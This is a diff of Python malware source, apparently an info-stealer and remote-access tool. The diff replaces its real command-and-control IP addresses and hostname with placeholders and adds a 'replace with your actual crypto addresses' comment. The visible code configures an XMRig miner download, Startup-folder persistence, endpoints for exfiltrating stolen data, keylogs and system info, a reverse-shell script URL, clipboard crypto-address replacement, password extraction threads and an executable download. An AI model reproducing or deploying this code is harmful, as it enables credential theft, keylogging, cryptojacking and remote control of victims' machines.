@@ -31,13 +31,13 @@ XMIRG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22
 BITCOIN_ADDRESS = "82WFpBT3pLrBHDHXpe5TL2cQLEepYDieiDMZADyb3pHLd8oQCrMLs44WCi8vBN3aT8AkbRXnhry5JFEdyS9nzWSP6jDNWn1"
 EXTRACT_BASE_DIR = os.path.join(os.getenv("TEMP"), "Shell")
 STARTUP_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", f"update_{random.randint(1000,9999)}.vbs")
-VPS_URL = "http://185.126.82.176:4118"
+VPS_URL = "http://<vps_url>:port"
 DATA_ENDPOINT = f"{VPS_URL}/save_data"
 KEYLOG_ENDPOINT = f"{VPS_URL}/save_keylog"
 SYSINFO_ENDPOINT = f"{VPS_URL}/save_sysinfo"
 USERPROFILE = os.environ['USERPROFILE']
 
-hack_script_url = "http://185.126.82.176:13370/reverse_shell"
+hack_script_url = "http://link.com/reverse_shell"
 
 
 BROWSER_PATHS = {
@@ -52,7 +52,7 @@ log_queue = queue.Queue()
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 logger = logging.getLogger()
-
+## replace with your actual crypto addresses
 REPLACEMENT_ADDRESSES = {
     'bitcoin_legacy': '1CPaziTqeEixPoSFtJxu74uDGbpEAotZom',
     'segwit': '0xe356157b349C6E9B32AB05dEF47D964B49d927Bb',
@@ -413,7 +413,7 @@ def main():
     threading.Thread(target=extract_passwords, daemon=True).start()
     threading.Thread(target=send_logs, daemon=True).start()
     
-    exe_url = "http://blackhats.thehomeserver.net"
+    exe_url = "http://exelink.com/download"
     startup_folder = get_startup_folder()
     exe_path = os.path.join(startup_folder, "_.exe")
 
